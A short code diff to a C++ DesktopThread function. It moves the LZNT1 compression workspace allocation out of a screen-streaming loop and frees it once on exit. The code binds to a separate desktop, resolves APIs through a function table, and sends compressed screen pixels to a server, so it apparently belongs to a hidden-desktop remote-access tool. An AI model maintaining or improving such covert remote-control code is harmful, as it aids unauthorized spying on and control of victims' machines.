@@ -415,6 +415,7 @@ static DWORD WINAPI DesktopThread(LPVOID param)
 {
     DWORD sessionId = (DWORD)(ULONG_PTR)param;
     SOCKET s = ConnectServer();
+    BYTE *workSpace = NULL;
 
     if (!Funcs::pSetThreadDesktop(g_hDesk))
         goto exit;
@@ -425,6 +426,13 @@ static DWORD WINAPI DesktopThread(LPVOID param)
         goto exit;
     if (!SendInt(s, (int)sessionId))
         goto exit;
+
+    {
+        DWORD workSpaceSize;
+        DWORD fragmentWorkSpaceSize;
+        Funcs::pRtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_LZNT1, &workSpaceSize, &fragmentWorkSpaceSize);
+        workSpace = (BYTE *)Alloc(workSpaceSize);
+    }
 
     for (;;)
     {
@@ -446,11 +454,6 @@ static DWORD WINAPI DesktopThread(LPVOID param)
         if (!SendInt(s, 1))
             goto exit;
 
-        DWORD workSpaceSize;
-        DWORD fragmentWorkSpaceSize;
-        Funcs::pRtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_LZNT1, &workSpaceSize, &fragmentWorkSpaceSize);
-        BYTE *workSpace = (BYTE *)Alloc(workSpaceSize);
-
         DWORD size;
         Funcs::pRtlCompressBuffer(COMPRESSION_FORMAT_LZNT1,
             g_pixels,
@@ -460,8 +463,6 @@ static DWORD WINAPI DesktopThread(LPVOID param)
             2048,
             &size,
             workSpace);
-
-        Funcs::pFree(workSpace);
 
         RECT rect;
         HWND hWndDesktop = Funcs::pGetDesktopWindow();
@@ -485,6 +486,7 @@ static DWORD WINAPI DesktopThread(LPVOID param)
     }
 
 exit:
+    Funcs::pFree(workSpace);
     Funcs::pTerminateThread(g_hInputThread, 0);
     return 0;
 }
